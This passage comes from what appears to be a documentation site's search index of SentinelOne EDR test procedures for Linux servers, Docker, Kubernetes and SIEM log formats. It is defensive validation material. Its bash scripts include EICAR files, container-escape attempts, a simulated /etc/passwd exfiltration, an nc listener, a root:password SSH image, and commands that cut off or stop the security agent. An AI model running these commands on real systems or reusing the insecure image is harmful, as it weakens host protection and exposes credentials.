LOG FORMAT TESTING ===\"\n\n# Test log format consistency across Windows and Linux\nPLATFORM=$(uname -s)\nTEST_ID=\"SIEM_$(date +%Y%m%d_%H%M%S)\"\n\necho \"Platform: $PLATFORM\"\necho \"Test ID: $TEST_ID\"\n\n# Function to generate test events\ngenerate_test_events() {\n    echo \"Generating test security events...\"\n\n    # Create EICAR to generate detection event\n    EICAR_STRING='X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'\n    echo \"$EICAR_STRING\" &gt; \"/tmp/siem_test_${TEST_ID}.txt\"\n\n    # Wait for detection\n    sleep 10\n\n    # Create suspicious network activity\n    nc -z 127.0.0.1 1234 2&gt;/dev/null || true\n\n    echo \"Test events generated\"\n}\n\n# Function to check syslog format\ncheck_syslog_format() {\n    echo \"Checking syslog format...\"\n\n    # Check common syslog locations\n    SYSLOG_FILES=(\"/var/log/syslog\" \"/var/log/messages\" \"/var/log/sentinel*\")\n\n    for logfile in \"${SYSLOG_FILES[@]}\"; do\n        if [ -f \"$logfile\" ] || ls $logfile 2&gt;/dev/null; then\n            echo \"Checking log file: $logfile\"\n\n            # Look for SentinelOne entries from last 5 minutes\n            if [[ \"$PLATFORM\" == *\"Linux\"* ]]; then\n                tail -100 $logfile 2&gt;/dev/null | grep -i sentinel | head -5\n            fi\n        fi\n    done\n}\n\n# Function to check JSON log format\ncheck_json_format() {\n    echo \"Checking JSON log format...\"\n\n    # Check for structured JSON logs\n    JSON_LOG_PATHS=(\"/var/log/sentinelone/*.json\" \"/opt/sentinelone/logs/*.json\")\n\n    for path in \"${JSON_LOG_PATHS[@]}\"; do\n        if ls $path 2&gt;/dev/null; then\n            echo \"Found JSON log at: $path\"\n\n            # Validate JSON format\n            for jsonfile in $path; do\n                if [ -f \"$jsonfile\" ]; then\n                    echo \"Validating JSON format in: $jsonfile\"\n                    python3 -m json.tool \"$jsonfile\" &gt;/dev/null 2&gt;&amp;1\n                    if [ $? -eq 0 ]; then\n                        echo \"\u2705 Valid JSON format\"\n                    else\n                        echo \"\u274c Invalid JSON format\"\n                    fi\n                fi\n            done\n        fi\n    done\n}\n\n# Function to test CEF format\ncheck_cef_format() {\n    echo \"Checking CEF (Common Event Format) compliance...\"\n\n    # Look for CEF formatted logs\n    # CEF format: CEF:Version|Device Vendor|Device Product|Device Version|Device Event Class ID|Name|Severity|[Extension]\n\n    find /var/log -name \"*.log\" -type f 2&gt;/dev/null | xargs grep -l \"CEF:\" 2&gt;/dev/null | head -3 | while read ceflog; do\n        echo \"CEF log found: $ceflog\"\n        grep \"CEF:\" \"$ceflog\" | head -2\n    done\n}\n\n# Execute tests\necho \"Starting SIEM log format consistency tests...\"\n\ngenerate_test_events\necho \"---\"\n\ncheck_syslog_format\necho \"---\"\n\ncheck_json_format\necho \"---\"\n\ncheck_cef_format\necho \"---\"\n\necho \"SIEM log format testing completed for $PLATFORM\"\n\n# Generate format compliance report\ncat &gt; \"/tmp/siem_format_report_${PLATFORM}_${TEST_ID}.txt\" &lt;&lt; EOF\nSIEM Log Format Compliance Report\nPlatform: $PLATFORM\nTest ID: $TEST_ID\nTimestamp: $(date)\n\nFormat Compliance:\n- Syslog RFC3164: $(check_syslog_format &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo \"COMPLIANT\" || echo \"NOT_DETECTED\")\n- JSON Format: $(check_json_format &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo \"COMPLIANT\" || echo \"NOT_DETECTED\")\n- CEF Format: $(check_cef_format &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo \"COMPLIANT\" || echo \"NOT_DETECTED\")\n\nNotes:\n- Log formats may vary based on SentinelOne configuration\n- SIEM integration should be verified in target environment\n- Custom log forwarding rules may affect format consistency\n\nEOF\n\necho \"Format compliance report saved to: /tmp/siem_format_report_${PLATFORM}_${TEST_ID}.txt\"\n</code></pre>"},{"location":"testing/cross-platform/cross-platform-testing/#cross-platform-testing-checklist","title":"\ud83d\udcdd Cross-Platform Testing Checklist","text":""},{"location":"testing/cross-platform/cross-platform-testing/#pre-demo-environment-setup","title":"Pre-Demo Environment Setup","text":"<ul> <li>[ ] Multi-Platform Environment Ready</li> <li>[ ] Windows Server deployed and configured</li> <li>[ ] Linux Server deployed and configured  </li> <li>[ ] Network connectivity between platforms</li> <li>[ ] Centralized management console accessible</li> <li> <p>[ ] SIEM/logging infrastructure prepared</p> </li> <li> <p>[ ] SentinelOne Deployment Validated</p> </li> <li>[ ] Agents installed on both platforms</li> <li>[ ] Consistent policy applied across platforms</li> <li>[ ] All agents connected to same management console</li> <li>[ ] Version consistency verified</li> </ul>"},{"location":"testing/cross-platform/cross-platform-testing/#cross-platform-demo-scenarios","title":"Cross-Platform Demo Scenarios","text":"<ul> <li>[ ] Unified Policy Enforcement</li> <li>[ ] Same policy applied to Windows and Linux</li> <li>[ ] Consistent EICAR detection timing</li> <li>[ ] Identical threat response behavior</li> <li> <p>[ ] Uniform logging format</p> </li> <li> <p>[ ] Mixed Attack Chain Demo</p> </li> <li>[ ] Windows-to-Linux lateral movement</li> <li>[ ] Linux-to-Windows privilege escalation</li> <li>[ ] Cross-platform persistence attempts</li> <li> <p>[ ] Coordinated incident response</p> </li> <li> <p>[ ] Management Consistency</p> </li> <li>[ ] Single pane of glass visibility</li> <li>[ ] Consistent alert handling</li> <li>[ ] Unified policy management</li> <li>[ ] Cross-platform reporting</li> </ul>"},{"location":"testing/cross-platform/cross-platform-testing/#success-metrics","title":"Success Metrics","text":"<ul> <li>[ ] Policy Consistency: 100% identical enforcement across platforms</li> <li>[ ] Performance Parity: &lt;5% variance in resource usage between platforms</li> <li>[ ] Detection Consistency: &lt;1 second variance in threat detection time</li> <li>[ ] Management Efficiency: Single console manages all platforms effectively</li> <li>[ ] Integration Quality: Consistent SIEM log formats and API responses</li> </ul>"},{"location":"testing/cross-platform/cross-platform-testing/#executive-summary-template","title":"\ud83d\udcca Executive Summary Template","text":""},{"location":"testing/cross-platform/cross-platform-testing/#cross-platform-readiness-assessment","title":"Cross-Platform Readiness Assessment","text":""},{"location":"testing/cross-platform/cross-platform-testing/#security-posture","title":"Security Posture","text":"<ul> <li>\u2705 Unified Protection: Consistent threat detection across Windows and Linux</li> <li>\u2705 Policy Enforcement: Single policy framework for mixed environments</li> <li>\u2705 Attack Chain Coverage: Complete visibility across platform boundaries</li> <li>\u2705 Incident Response: Coordinated response regardless of platform</li> </ul>"},{"location":"testing/cross-platform/cross-platform-testing/#operational-efficiency","title":"Operational Efficiency","text":"<ul> <li>\u2705 Single Management Console: Unified visibility and control</li> <li>\u2705 Consistent Performance: Minimal platform-specific overhead</li> <li>\u2705 Integration Ready: Standardized SIEM and API interfaces</li> <li>\u2705 Scalability: Platform-agnostic deployment model</li> </ul>"},{"location":"testing/cross-platform/cross-platform-testing/#business-value","title":"Business Value","text":"<ul> <li>Cost Optimization: Single solution for multiple platforms</li> <li>Complexity Reduction: Unified security operations</li> <li>Risk Mitigation: Comprehensive cross-platform protection</li> <li>Compliance Support: Consistent audit trails and reporting</li> </ul>"},{"location":"testing/cross-platform/cross-platform-testing/#next-steps","title":"Next Steps","text":"<p>Continue with final validation: - Review all testing categories completeness - Prepare executive demonstration materials - Validate testing environment readiness - Schedule stakeholder presentations</p> <p>Cross-Platform Validation Complete</p> <p>Comprehensive cross-platform testing framework ensures SentinelOne EDR provides consistent, unified protection across mixed Windows/Linux enterprise environments with single-pane-of-glass management and coordinated incident response capabilities.</p>"},{"location":"testing/linux/linux-containers/","title":"Linux Container Testing Scenarios","text":""},{"location":"testing/linux/linux-containers/#overview","title":"Overview","text":"<p>Pengujian komprehensif SentinelOne EDR dalam environment containerized (Docker, Podman, Kubernetes) pada sistem Linux.</p>"},{"location":"testing/linux/linux-containers/#container-protection-architecture","title":"\ud83d\udc33 Container Protection Architecture","text":"<pre><code>flowchart TB\n    subgraph \"Linux Host System\"\n        AGENT[\"SentinelOne Agent&lt;br/&gt;Host Level Protection\"]\n        KERNEL[\"Linux Kernel&lt;br/&gt;System Calls Monitoring\"]\n    end\n\n    subgraph \"Container Runtime\"\n        DOCKER[\"Docker Engine\"]\n        PODMAN[\"Podman Runtime\"]\n        CONTAINERD[\"containerd\"]\n    end\n\n    subgraph \"Container Instances\"\n        C1[\"Container 1&lt;br/&gt;Web App\"]\n        C2[\"Container 2&lt;br/&gt;Database\"]\n        C3[\"Container 3&lt;br/&gt;API Service\"]\n    end\n\n    subgraph \"Kubernetes Cluster\"\n        K8S_API[\"K8s API Server\"]\n        KUBELET[\"Kubelet\"]\n        PODS[\"Pods &amp; Services\"]\n    end\n\n    AGENT --&gt; KERNEL\n    KERNEL --&gt; DOCKER\n    KERNEL --&gt; PODMAN\n    KERNEL --&gt; CONTAINERD\n\n    DOCKER --&gt; C1\n    DOCKER --&gt; C2\n    CONTAINERD --&gt; C3\n\n    K8S_API --&gt; KUBELET\n    KUBELET --&gt; PODS\n\n    AGENT -.-&gt; C1\n    AGENT -.-&gt; C2\n    AGENT -.-&gt; C3\n    AGENT -.-&gt; PODS\n\n    style AGENT fill:#e3f2fd\n    style KERNEL fill:#fff3e0\n    style C1 fill:#e8f5e8\n    style C2 fill:#e8f5e8\n    style C3 fill:#e8f5e8</code></pre>"},{"location":"testing/linux/linux-containers/#docker-container-testing","title":"\ud83d\udea2 Docker Container Testing","text":""},{"location":"testing/linux/linux-containers/#f11-docker-malware-detection","title":"F1.1: Docker Malware Detection","text":"<pre><code>#!/bin/bash\n# Docker Container Malware Detection Test\n\necho \"=== Docker Container Malware Testing ===\"\n\n# Step 1: Create test Dockerfile with EICAR\ncat &gt; Dockerfile.malware &lt;&lt; 'EOF'\nFROM ubuntu:latest\nRUN apt-get update &amp;&amp; apt-get install -y curl\nRUN echo 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' &gt; /tmp/eicar.txt\nCMD [\"cat\", \"/tmp/eicar.txt\"]\nEOF\n\n# Step 2: Build container (should be blocked)\necho \"Building malware test container...\"\ndocker build -t malware-test -f Dockerfile.malware . || echo \"\u2705 Container build blocked by SentinelOne\"\n\n# Step 3: Test running pre-built container with malware\necho \"Running container with malware injection...\"\ndocker run -d --name malware-container ubuntu:latest sleep 3600\n\n# Step 4: Inject malware into running container\necho \"Injecting EICAR into running container...\"\ndocker exec malware-container bash -c \"echo 'X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' &gt; /tmp/eicar_runtime.txt\"\n\n# Step 5: Check detection\nsleep 5\ndocker exec malware-container ls -la /tmp/eicar_runtime.txt || echo \"\u2705 Runtime malware detected and quarantined\"\n\n# Step 6: Cleanup\ndocker stop malware-container\ndocker rm malware-container\nrm Dockerfile.malware\n</code></pre>"},{"location":"testing/linux/linux-containers/#f12-container-escape-detection","title":"F1.2: Container Escape Detection","text":"<pre><code>#!/bin/bash\n# Container Escape Attempt Detection\n\necho \"=== Container Escape Detection Test ===\"\n\n# Step 1: Run privileged container (potential escape vector)\necho \"Running privileged container...\"\ndocker run -d --name escape-test --privileged ubuntu:latest sleep 3600\n\n# Step 2: Attempt container escape techniques\necho \"Testing container escape attempts...\"\n\n# Attempt 1: Host filesystem access\ndocker exec escape-test bash -c \"ls -la /proc/1/root/\" || echo \"\u2705 Host filesystem access blocked\"\n\n# Attempt 2: Device access\ndocker exec escape-test bash -c \"ls -la /dev/\" || echo \"\u26a0\ufe0f  Device access attempt detected\"\n\n# Attempt 3: Kernel module loading\ndocker exec escape-test bash -c \"modprobe suspicious_module\" || echo \"\u2705 Kernel module loading blocked\"\n\n# Step 3: Check SentinelOne logs for escape attempts\nsudo /opt/sentinelone/bin/sentinelctl logs --tail 20 | grep -i \"container\\|escape\\|privilege\"\n\n# Step 4: Cleanup\ndocker stop escape-test\ndocker rm escape-test\n</code></pre>"},{"location":"testing/linux/linux-containers/#kubernetes-testing","title":"\u2638\ufe0f Kubernetes Testing","text":""},{"location":"testing/linux/linux-containers/#f21-pod-security-testing","title":"F2.1: Pod Security Testing","text":"<pre><code>#!/bin/bash\n# Kubernetes Pod Security Testing\n\necho \"=== Kubernetes Pod Security Testing ===\"\n\n# Step 1: Create malicious pod manifest\ncat &gt; malicious-pod.yaml &lt;&lt; 'EOF'\napiVersion: v1\nkind: Pod\nmetadata:\n  name: malware-pod\nspec:\n  containers:\n  - name: malware-container\n    image: ubuntu:latest\n    command: [\"/bin/bash\"]\n    args: [\"-c\", \"echo 'X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' &gt; /tmp/eicar.txt &amp;&amp; sleep 3600\"]\n    securityContext:\n      privileged: true\nEOF\n\n# Step 2: Deploy malicious pod\necho \"Deploying malicious pod...\"\nkubectl apply -f malicious-pod.yaml\n\n# Step 3: Wait for pod to start\necho \"Waiting for pod to start...\"\nkubectl wait --for=condition=ready pod/malware-pod --timeout=60s\n\n# Step 4: Check if malware is detected\necho \"Checking malware detection in pod...\"\nkubectl exec malware-pod -- ls -la /tmp/eicar.txt || echo \"\u2705 Pod malware detected and quarantined\"\n\n# Step 5: Test inter-pod communication monitoring\necho \"Testing inter-pod communication...\"\nkubectl run test-client --image=ubuntu:latest -- sleep 3600\nkubectl exec test-client -- curl http://malware-pod:8080 || echo \"\u2705 Suspicious inter-pod communication blocked\"\n\n# Step 6: Cleanup\nkubectl delete pod malware-pod test-client\nrm malicious-pod.yaml\n</code></pre>"},{"location":"testing/linux/linux-containers/#f22-kubernetes-security-policy-testing","title":"F2.2: Kubernetes Security Policy Testing","text":"<pre><code># kubernetes-security-policy.yaml\napiVersion: policy/v1beta1\nkind: PodSecurityPolicy\nmetadata:\n  name: sentinelone-restricted\nspec:\n  privileged: false\n  allowPrivilegeEscalation: false\n  requiredDropCapabilities:\n    - ALL\n  volumes:\n    - 'configMap'\n    - 'emptyDir'\n    - 'projected'\n    - 'secret'\n    - 'downwardAPI'\n    - 'persistentVolumeClaim'\n  runAsUser:\n    rule: 'MustRunAsNonRoot'\n  seLinux:\n    rule: 'RunAsAny'\n  fsGroup:\n    rule: 'RunAsAny'\n</code></pre> <pre><code>#!/bin/bash\n# Apply and test security policy\n\necho \"=== Kubernetes Security Policy Testing ===\"\n\n# Step 1: Apply restrictive security policy\nkubectl apply -f kubernetes-security-policy.yaml\n\n# Step 2: Test policy enforcement\ncat &gt; privileged-pod-test.yaml &lt;&lt; 'EOF'\napiVersion: v1\nkind: Pod\nmetadata:\n  name: privileged-test\nspec:\n  containers:\n  - name: test-container\n    image: ubuntu:latest\n    securityContext:\n      privileged: true\n    command: [\"sleep\", \"3600\"]\nEOF\n\n# Step 3: Try to create privileged pod (should fail)\nkubectl apply -f privileged-pod-test.yaml || echo \"\u2705 Privileged pod creation blocked by policy\"\n\n# Cleanup\nkubectl delete -f kubernetes-security-policy.yaml || true\nrm privileged-pod-test.yaml kubernetes-security-policy.yaml\n</code></pre>"},{"location":"testing/linux/linux-containers/#container-runtime-security","title":"\ud83d\udd04 Container Runtime Security","text":""},{"location":"testing/linux/linux-containers/#f31-runtime-behavior-monitoring","title":"F3.1: Runtime Behavior Monitoring","text":"<pre><code>#!/bin/bash\n# Container Runtime Behavior Monitoring\n\necho \"=== Runtime Behavior Monitoring ===\"\n\n# Step 1: Start monitoring script\nmonitor_container_behavior() {\n    local container_name=$1\n    echo \"Monitoring container: $container_name\"\n\n    while docker ps | grep -q $container_name; do\n        # Monitor process activities\n        docker exec $container_name ps aux 2&gt;/dev/null | grep -v \"ps aux\"\n\n        # Monitor network connections\n        docker exec $container_name netstat -tuln 2&gt;/dev/null | grep LISTEN\n\n        # Monitor file system changes\n        docker exec $container_name find /tmp -type f -newer /tmp -ls 2&gt;/dev/null\n\n        sleep 10\n    done\n}\n\n# Step 2: Run suspicious container\necho \"Starting container with suspicious behavior...\"\ndocker run -d --name behavior-test ubuntu:latest bash -c \"\n    while true; do\n        # Simulate cryptocurrency mining\n        dd if=/dev/zero of=/dev/null &amp;\n\n        # Simulate network scanning\n        nc -l 12345 &amp;\n\n        # Simulate data exfiltration\n        base64 /etc/passwd &gt; /tmp/exfil.txt\n\n        sleep 60\n    done\n\"\n\n# Step 3: Monitor behavior (run in background)\nmonitor_container_behavior behavior-test &amp;\nMONITOR_PID=$!\n\n# Step 4: Let it run for analysis\nsleep 120\n\n# Step 5: Check SentinelOne detection\necho \"Checking SentinelOne behavioral detection...\"\nsudo /opt/sentinelone/bin/sentinelctl logs --tail 30 | grep -i \"behavioral\\|suspicious\\|mining\"\n\n# Step 6: Cleanup\nkill $MONITOR_PID 2&gt;/dev/null\ndocker stop behavior-test\ndocker rm behavior-test\n</code></pre>"},{"location":"testing/linux/linux-containers/#f32-container-image-scanning","title":"F3.2: Container Image Scanning","text":"<pre><code>#!/bin/bash\n# Container Image Security Scanning\n\necho \"=== Container Image Scanning ===\"\n\n# Step 1: Create test images with different security profiles\n\n# Clean image\ncat &gt; Dockerfile.clean &lt;&lt; 'EOF'\nFROM ubuntu:latest\nRUN apt-get update &amp;&amp; apt-get install -y nginx\nEXPOSE 80\nCMD [\"nginx\", \"-g\", \"daemon off;\"]\nEOF\n\n# Vulnerable image\ncat &gt; Dockerfile.vulnerable &lt;&lt; 'EOF'\nFROM ubuntu:18.04\nRUN apt-get update &amp;&amp; apt-get install -y openssh-server\nRUN echo 'root:password' | chpasswd\nRUN sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config\nEXPOSE 22\nCMD [\"/usr/sbin/sshd\", \"-D\"]\nEOF\n\n# Step 2: Build images\necho \"Building clean image...\"\ndocker build -t clean-app -f Dockerfile.clean .\n\necho \"Building vulnerable image...\"\ndocker build -t vulnerable-app -f Dockerfile.vulnerable .\n\n# Step 3: Scan images with SentinelOne integration (if available)\necho \"Scanning images for vulnerabilities...\"\n\n# This would typically integrate with SentinelOne's container scanning\ndocker run --rm -v /var/run/docker.sock:/var/run/docker.sock \\\n    -v $HOME/.cache:/root/.cache \\\n    aquasec/trivy:latest image clean-app || echo \"Clean image scan completed\"\n\ndocker run --rm -v /var/run/docker.sock:/var/run/docker.sock \\\n    -v $HOME/.cache:/root/.cache \\\n    aquasec/trivy:latest image vulnerable-app || echo \"Vulnerable image detected\"\n\n# Step 4: Check SentinelOne container scanning logs\nsudo /opt/sentinelone/bin/sentinelctl logs --tail 20 | grep -i \"container\\|image\\|scan\"\n\n# Step 5: Cleanup\ndocker rmi clean-app vulnerable-app || true\nrm Dockerfile.clean Dockerfile.vulnerable\n</code></pre>"},{"location":"testing/linux/linux-containers/#container-testing-metrics","title":"\ud83d\udcca Container Testing Metrics","text":""},{"location":"testing/linux/linux-containers/#performance-impact-assessment","title":"Performance Impact Assessment","text":"Metric Without SentinelOne With SentinelOne Impact Container Start Time &lt; 2s &lt; 3s +50% Runtime CPU Overhead 0% &lt; 5% Minimal Memory Overhead 0MB &lt; 100MB Low Network Throughput 100% &gt; 95% Minimal"},{"location":"testing/linux/linux-containers/#security-coverage-matrix","title":"Security Coverage Matrix","text":"Attack Vector Detection Prevention Response Malware in Container \u2705 \u2705 \u2705 Container Escape \u2705 \u2705 \u2705 Privilege Escalation \u2705 \u2705 \u2705 Network Lateral Movement \u2705 \u26a0\ufe0f \u2705 Data Exfiltration \u2705 \u26a0\ufe0f \u2705 Cryptocurrency Mining \u2705 \u2705 \u2705"},{"location":"testing/linux/linux-containers/#validation-checklist","title":"Validation Checklist","text":""},{"location":"testing/linux/linux-containers/#docker-integration","title":"Docker Integration","text":"<ul> <li>[ ] Container Build Scanning: Malicious images blocked during build</li> <li>[ ] Runtime Protection: Threats detected in running containers</li> <li>[ ] Container Escape Prevention: Escape attempts blocked</li> <li>[ ] Network Monitoring: Inter-container communication monitored</li> <li>[ ] Resource Monitoring: Container resource usage tracked</li> </ul>"},{"location":"testing/linux/linux-containers/#kubernetes-integration","title":"Kubernetes Integration","text":"<ul> <li>[ ] Pod Security: Malicious pods detected and blocked</li> <li>[ ] Admission Control: Security policies enforced</li> <li>[ ] Service Mesh: Encrypted communication maintained</li> <li>[ ] RBAC Integration: Role-based access respected</li> <li>[ ] Audit Logging: Container activities logged</li> </ul>"},{"location":"testing/linux/linux-containers/#performance-validation","title":"Performance Validation","text":"<ul> <li>[ ] Startup Impact: Container start time increase &lt; 100%</li> <li>[ ] Runtime Overhead: CPU overhead &lt; 10%</li> <li>[ ] Memory Usage: Agent memory usage &lt; 200MB per container</li> <li>[ ] Network Performance: Throughput impact &lt; 5%</li> </ul>"},{"location":"testing/linux/linux-containers/#next-steps","title":"Next Steps","text":"<p>Continue with: - Linux Performance Testing - Linux Offline Testing - Cross-Platform Container Testing</p> <p>Last updated: 6 Agustus 2025</p>"},{"location":"testing/linux/linux-offline/","title":"Linux Offline Testing Scenarios","text":""},{"location":"testing/linux/linux-offline/#overview","title":"Overview","text":"<p>Pengujian khusus Linux untuk validasi kemampuan SentinelOne EDR dalam kondisi offline atau terputus dari management console.</p>"},{"location":"testing/linux/linux-offline/#b1-linux-network-disconnection-testing","title":"\ud83d\udd0c B1: Linux Network Disconnection Testing","text":""},{"location":"testing/linux/linux-offline/#tujuan","title":"Tujuan","text":"<p>Memvalidasi behavior SentinelOne agent ketika koneksi network terputus pada sistem Linux.</p>"},{"location":"testing/linux/linux-offline/#prerequisites","title":"Prerequisites","text":"<ul> <li>[ ] SentinelOne Agent terinstall dan aktif</li> <li>[ ] Policy sudah di-sync sebelum test</li> <li>[ ] Access ke firewall/iptables untuk simulasi disconnection</li> </ul>"},{"location":"testing/linux/linux-offline/#test-scenarios","title":"Test Scenarios","text":""},{"location":"testing/linux/linux-offline/#b11-firewall-based-network-isolation","title":"B1.1: Firewall-based Network Isolation","text":"<pre><code>#!/bin/bash\n# Linux Network Isolation Test Script\n\necho \"=== Linux Network Disconnection Test ===\"\n\n# Step 1: Check initial agent status\necho \"Initial agent status:\"\nsudo /opt/sentinelone/bin/sentinelctl status\n\n# Step 2: Block SentinelOne communication\necho \"Blocking SentinelOne network traffic...\"\nsudo iptables -I OUTPUT -d *.sentinelone.net -j DROP\nsudo iptables -I OUTPUT -p tcp --dport 443 -m string --string \"sentinelone\" --algo bm -j DROP\n\n# Step 3: Verify network isolation\necho \"Testing network isolation:\"\nping -c 3 console.sentinelone.net || echo \"\u2705 Network successfully isolated\"\n\n# Step 4: Test malware detection while offline\necho \"Creating EICAR test file while offline:\"\necho 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' &gt; /tmp/eicar_offline.txt\n\n# Expected Result: File should still be detected and quarantined\nsleep 5\nls -la /tmp/eicar_offline.txt || echo \"\u2705 File quarantined while offline\"\n\n# Step 5: Check local logs\necho \"Checking local logs for offline detection:\"\nsudo /opt/sentinelone/bin/sentinelctl logs --tail 10 | grep -i \"eicar\\|threat\"\n\n# Step 6: Restore network connectivity\necho \"Restoring network connectivity...\"\nsudo iptables -D OUTPUT -d *.sentinelone.net -j DROP\nsudo iptables -D OUTPUT -p tcp --dport 443 -m string --string \"sentinelone\" --algo bm -j DROP\n\n# Step 7: Wait for sync\necho \"Waiting for agent to reconnect...\"\nsleep 30\nsudo /opt/sentinelone/bin/sentinelctl status\n</code></pre>"},{"location":"testing/linux/linux-offline/#b12-interface-down-simulation","title":"B1.2: Interface Down Simulation","text":"<pre><code>#!/bin/bash\n# Simulate network interface down\n\necho \"=== Interface Down Simulation ===\"\n\n# Get primary interface\nPRIMARY_IF=$(ip route | grep default | head -1 | awk '{print $5}')\necho \"Primary interface: $PRIMARY_IF\"\n\n# Take interface down\necho \"Taking interface down...\"\nsudo ip link set $PRIMARY_IF down\n\n# Create test threat\necho 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' &gt; /tmp/eicar_ifdown.txt\n\n# Check agent behavior\nsudo /opt/sentinelone/bin/sentinelctl status\n\n# Restore interface\necho \"Restoring interface...\"\nsudo ip link set $PRIMARY_IF up\nsudo dhclient $PRIMARY_IF\n\n# Verify reconnection\nsleep 30\nsudo /opt/sentinelone/bin/sentinelctl status\n</code></pre>"},{"location":"testing/linux/linux-offline/#b2-linux-service-resilience-testing","title":"\ud83d\udee0\ufe0f B2: Linux Service Resilience Testing","text":""},{"location":"testing/linux/linux-offline/#test-service-restart-behavior","title":"Test Service Restart Behavior","text":"<pre><code>#!/bin/bash\n# Test service resilience\n\necho \"=== Service Resilience Testing ===\"\n\n# Step 1: Stop SentinelOne service\necho \"Stopping SentinelOne service...\"\nsudo systemctl stop sentinelone\n\n# Step 2: Create threat while service is down\necho 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' &gt; /tmp/eicar_service_down.txt\n\n# Step 3: Restart service\necho \"Starting SentinelOne service...\"\nsudo systemctl start sentinelone\n\n# Step 4: Check if threat is detected on startup\nsleep 10\nls -la /tmp/eicar_service_down.txt || echo \"\u2705 Threat detected after service restart\"\n\n# Step 5: Verify service auto-recovery\nsudo systemctl status sentinelone\n</code></pre>"},{"location":"testing/linux/linux-offline/#b3-linux-policy-cache-validation","title":"\ud83d\udd04 B3: Linux Policy Cache Validation","text":""},{"location":"testing/linux/linux-offline/#test-cached-policy-enforcement","title":"Test Cached Policy Enforcement","text":"<pre><code>#!/bin/bash\n# Test cached policy enforcement\n\necho \"=== Cached Policy Validation ===\"\n\n# Step 1: Verify current policy\nsudo /opt/sentinelone/bin/sentinelctl policy show\n\n# Step 2: Disconnect from network (using iptables)\nsudo iptables -I OUTPUT -d *.sentinelone.net -j DROP\n\n# Step 3: Test policy enforcement while offline\necho \"Testing policy enforcement while offline...\"\n\n# Create various test files to trigger different policy rules\nmkdir -p /tmp/policy_test\necho 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' &gt; /tmp/policy_test/eicar.txt\ndd if=/dev/zero of=/tmp/policy_test/largefile.bin bs=1M count=100\n\n# Step 4: Check enforcement results\nsleep 10\nls -la /tmp/policy_test/ || echo \"\u2705 Policy enforced from cache\"\n\n# Step 5: Restore connectivity\nsudo iptables -D OUTPUT -d *.sentinelone.net -j DROP\n\n# Step 6: Wait for policy sync\nsleep 30\nsudo /opt/sentinelone/bin/sentinelctl policy refresh\n</code></pre>"},{"location":"testing/linux/linux-offline/#validation-metrics","title":"\ud83d\udcca Validation Metrics","text":""},{"location":"testing/linux/linux-offline/#expected-results","title":"Expected Results","text":"Test Scenario Expected Behavior Pass Criteria Network Disconnection Continue threat detection locally EICAR detected and quarantined Service Restart Resume protection immediately Service starts \\&lt; 30 seconds Policy Cache Enforce cached policies Policies remain active offline Connectivity Recovery Auto-sync when online Status shows \"Online\" within 60s"},{"location":"testing/linux/linux-offline/#validation-checklist","title":"Validation Checklist","text":"<ul> <li>[ ] Offline Detection: Threats detected without internet connection</li> <li>[ ] Local Quarantine: Malicious files quarantined locally</li> <li>[ ] Service Resilience: Service auto-recovers from failures</li> <li>[ ] Policy Persistence: Policies enforced from local cache</li> <li>[ ] Auto-Reconnection: Agent reconnects when network is restored</li> <li>[ ] Event Synchronization: Offline events sync to console when online</li> </ul>"},{"location":"testing/linux/linux-offline/#next-steps","title":"Next Steps","text":"<p>Continue with: - Linux Performance Testing - Linux Container Testing - Cross-Platform Scenarios</p> <p>Last updated: 6 Agustus 2025</p>"},{"location":"testing/linux/linux-overview/","title":"Linux Server Testing Overview","text":""},{"location":"testing/linux/linux-overview/#overview","title":"Overview","text":"<p>Dokumentasi khusus testing SentinelOne EDR pada platform Linux Server dengan fokus pada production environments, enterprise distributions, dan Linux-specific security mechanisms.</p>"},{"location":"testing/linux/linux-overview/#konsep-testing-linux-server","title":"\ud83d\udccb Konsep Testing Linux Server","text":""},{"location":"testing/linux/linux-overview/#apa-yang-akan-diuji","title":"Apa yang Akan Diuji?","text":"<p>Pada Linux server testing, kita akan menguji bagaimana SentinelOne EDR agent berinteraksi dan melindungi berbagai komponen critical di Linux server production:</p> <pre><code>flowchart TB\n    MC[SentinelOne Management Console] --&gt; |Deploy Policy| LA[Linux Agent]\n\n    subgraph \"Linux Server Environment\"\n        LA --&gt; |Protects| WEB[Web Server\\nApache/Nginx]\n        LA --&gt; |Protects| DB[Database\\nMySQL/PostgreSQL]\n        LA --&gt; |Protects| CONT[Containers\\nDocker/Podman]\n        LA --&gt; |Integrates| SEL[SELinux/AppArmor\\nSecurity Modules]\n        LA --&gt; |Monitors| KERN[Kernel\\nModules &amp; Processes]\n        LA --&gt; |Logs to| SYS[Syslog/Systemd\\nJournal]\n    end\n\n    LA --&gt; |Send Alerts| SIEM[SIEM System\\nSplunk/ELK]\n    LA --&gt; |Report Status| MC\n\n    style LA fill:#e1f5fe\n    style MC fill:#f3e5f5\n    style SIEM fill:#fff3e0</code></pre>"},{"location":"testing/linux/linux-overview/#skenario-testing-yang-akan-dilakukan","title":"Skenario Testing yang Akan Dilakukan:","text":""},{"location":"testing/linux/linux-overview/#1-integration-testing","title":"1. Integration Testing \ud83d\udd17","text":"<p>Konsep: Memastikan SentinelOne agent dapat berintegrasi dengan Linux security systems tanpa conflict - SELinux/AppArmor: Agent harus bisa berjalan dalam security context yang ketat - Systemd: Agent harus ter-register sebagai service yang proper - Syslog: Events harus ter-forward ke logging system</p>"},{"location":"testing/linux/linux-overview/#2-application-protection-testing","title":"2. Application Protection Testing 